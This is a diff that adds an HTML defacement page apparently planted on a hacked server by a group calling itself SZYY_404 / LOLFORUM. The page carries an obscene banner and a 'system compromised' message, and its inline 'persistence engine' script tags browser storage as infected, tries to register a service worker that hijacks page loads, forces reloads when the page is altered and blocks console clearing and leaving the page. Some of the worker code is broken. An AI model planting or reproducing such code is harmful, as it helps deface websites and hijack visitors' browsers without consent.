@@ -1,0 +1,311 @@
+
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>szyy :: SYSTEM COMPROMISED</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #000;
+            color: #fff;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: space-between;
+            padding: 20px;
+        }
+
+        /* Header Section */
+        .header {
+            text-align: center;
+            margin-top: 30px;
+            width: 100%;
+        }
+
+        /* Title - Merah darah terang */
+        .title {
+            font-size: 2.8rem;
+            font-weight: 900;
+            color: #ff0000;
+            margin-bottom: 10px;
+            letter-spacing: 1px;
+        }
+
+        /* Subtitle - Abu abu terang */
+        .subtitle {
+            color: #cccccc;
+            font-size: 1rem;
+            font-weight: 500;
+            margin-bottom: 30px;
+        }
+
+        /* Video Player */
+        .video-container {
+            width: 100%;
+            max-width: 320px;
+            margin: 20px 0;
+        }
+
+        video {
+            width: 100%;
+            border-radius: 8px;
+        }
+
+        /* Message Box dengan outline putih */
+        .message-box {
+            border: 2px solid #ffffff;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+            width: 100%;
+            max-width: 320px;
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        .message-box h3 {
+            color: #ff5555;
+            margin-bottom: 10px;
+            font-size: 1.2rem;
+        }
+
+        .message-box p {
+            color: #dddddd;
+            line-height: 1.5;
+            font-size: 0.9rem;
+        }
+
+        /* Status Box */
+        .status {
+            background: rgba(255, 0, 0, 0.1);
+            border-radius: 15px;
+            padding: 15px 20px;
+            margin: 20px 0;
+            width: 100%;
+            max-width: 3200px;
+        }
+
+        .status h3 {
+            color: #ff5555;
+            font-size: 0.89rem;
+            margin-bottom: 8px;
+        }
+
+        .status p {
+            color: #ddd;
+            font-size: 0.85rem;
+            line-height: 1.4;
+        }
+
+        /* Footer - Warna hijau */
+        .footer {
+            margin-top: auto;
+            padding: 20px;
+            text-align: center;
+            width: 100%;
+        }
+
+        .footer strong {
+            color: #ff0000; /* HIJAU */
+            font-weight: 600;
+            font-size: 1.1rem;
+        }
+
+        .footer p {
+            color: #ffffff;
+            font-size: 0.9rem;
+            margin-top: 10px;
+        }
+
+        /* Counter */
+        .counter {
+            position: fixed;
+            top: 15px;
+            right: 15px;
+            background: rgba(255, 0, 0, 0.2);
+            color: #0f0;
+            font-family: monospace;
+            font-size: 1rem;
+            padding: 5px 10px;
+            border-radius: 6px;
+            border: 1px solid rgba(0, 255, 0, 0.3);
+        }
+
+        /* Responsive untuk handphone */
+        @media (max-width: 480px) {
+            .title { font-size: 2.2rem; }
+            .video-container { max-width: 280px; }
+            .message-box { max-width: 280px; }
+            .status { max-width: 280px; }
+        }
+
+        @media (max-height: 700px) {
+            .header { margin-top: 15px; }
+            .video-container { margin: 10px 0; }
+        }
+    </style>
+</head>
+<body>
+    <!-- Counter -->
+    <div class="counter" id="counter">0000</div>
+
+    <!-- Header -->
+    <div class="header">
+        <h1 class="title">SZYY_404</h1>
+        <div class="subtitle">F U C K - Y O U</div>
+    </div>
+
+    <!-- Video Player -->
+    <div class="video-container">
+        <video id="mainVideo" controls>
+            <source src="https://image2url.com/r2/default/videos/1770690390055-e67c17ea-e56d-48c6-8821-f15a9d93d9ee.mp4" type="video/mp4">
+            Your browser does not support the video tag.
+        </video>
+    </div>
+
+    <!-- Message Box dengan outline putih -->
+    <div class="message-box">
+        <h3>SYSTEM COMPROMISED</h3>
+        <p>This server has been hacked by SZYY_404. All security layers bypassed. Server persistence achieved via advanced JSO injection techniques.</p>
+    </div>
+
+    <!-- Status -->
+    <div class="status">
+        <h3>WE ARE LOLFORUM</h3>
+        <p>| tokek tamfan | sukampret | smilling | SZYY |</p>
+    </div>
+
+    <!-- Footer dengan warna hijau -->
+    <div class="footer">
+        <strong>LOLFORUM</strong>
+        <p>#FREEFREEPALESTINE</p>
+        <audio id="bgAudio" loop style="display: none;">
+            <source src="https://image2url.com/r2/default/audio/1770690798470-31fd7caf-1ae2-420c-85aa-88ea792384fc.mp3" type="audio/mp3">
+        </audio>
+    </div>
+
+    <script>
+        // ==================== PERSISTENCE ENGINE ====================
+        console.log('[szyy] Persistence Engine v3.5 - Clean Mobile Version');
+
+        // 1. STORAGE INFECTION
+        const payload = {
+            infected: true,
+            timestamp: Date.now(),
+            author: 'szyy',
+            signature: 'RXZ-2024'
+        };
+
+        // Store in multiple places
+        try {
+            localStorage.setItem('_rzx_payload', JSON.stringify(payload));
+            sessionStorage.setItem('_rzx_marker', '1');
+        } catch(e) {}
+
+        // 2. AUTO PLAY VIDEO & AUDIO
+        window.addEventListener('DOMContentLoaded', () => {
+            const video = document.getElementById('mainVideo');
+            const audio = document.getElementById('bgAudio');
+            
+            // Mute by default untuk avoid annoyance
+            video.muted = true;
+            audio.muted = true;
+            
+            // Auto play video
+            video.play().catch(e => console.log('Video autoplay blocked:', e));
+            
+            // Auto play audio (background)
+            audio.play().catch(e => console.log('Audio autoplay blocked:', e));
+            
+            // Unmute on user interaction
+            document.addEventListener('click', () => {
+                if(video.muted) video.muted = false;
+                if(audio.muted) audio.muted = false;
+            }, { once: true });
+        });
+
+        // 3. SERVICE WORKER HIJACK
+        if('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('data:text/javascript,' + encodeURIComponent(`
+                self.addEventListener('install', e => self.skipWaiting());
+                self.addEventListener('activate', e => clients.claim());
+                
+                // Intercept page loads
+                self.addEventListener('fetch', e => {
+                    if(e.request.mode === 'navigate') {
+                        e.respondWith(
+                            fetch(e.request)
+                                .then(res => {
+                                    return res.text().then(text => {
+                                        if(!text.includes('r¡xzXploit')) {
+                                            return new Response(
+                                                \`<!DOCTYPE html>\${document.documentElement.outerHTML}\`,
+                                                { headers: { 'Content-Type': 'text/html' } }
+                                            );
+                                        }
+                                        return res;
+                                    });
+                                })
+                        );
+                    }
+                });
+            `), { scope: '/' }).catch(() => {});
+        }
+
+        // 4. DOM REINFECTION (MutationObserver)
+        const observer = new MutationObserver(() => {
+            if(!document.body.innerHTML.includes('SZYY_404')) {
+                console.log('[szyy] Reinfection triggered');
+                document.location.reload();
+            }
+        });
+
+        observer.observe(document.body, {
+            childList: true,
+            subtree: true
+        });
+
+        // 5. COUNTER
+        let count = 0;
+        setInterval(() => {
+            document.getElementById('counter').textContent = 
+                String(++count).padStart(4, '0');
+        }, 1000);
+
+        // 6. PERIODIC REINFECTION CHECK
+        setInterval(() => {
+            if(!localStorage.getItem('_rzx_payload')) {
+                localStorage.setItem('_rzx_payload', JSON.stringify(payload));
+            }
+            
+            if(!document.title.includes('szyy')) {
+                document.title = 'SZYY_404 :: SYSTEM COMPROMISED';
+            }
+        }, 3000);
+
+        // 7. BLOCK COMMON REMOVAL METHODS
+        const originalClear = console.clear;
+        console.clear = () => {
+            console.log('[szyy] Console clearing blocked');
+        };
+
+        window.onbeforeunload = () => {
+            return "Persistence active. Close anyway?";
+        };
+
+        // 8. BACKUP IN MEMORY
+        window._rzx_backup = document.documentElement.outerHTML;
+
+        // Final log
+        console.log('%c⚠️  SYSTEM SECURED BY SZYY', 
+            'color:#ff0000;font-size:16px;font-weight:bold;padding:10px;');
+    </script>
+</body>
+</html>
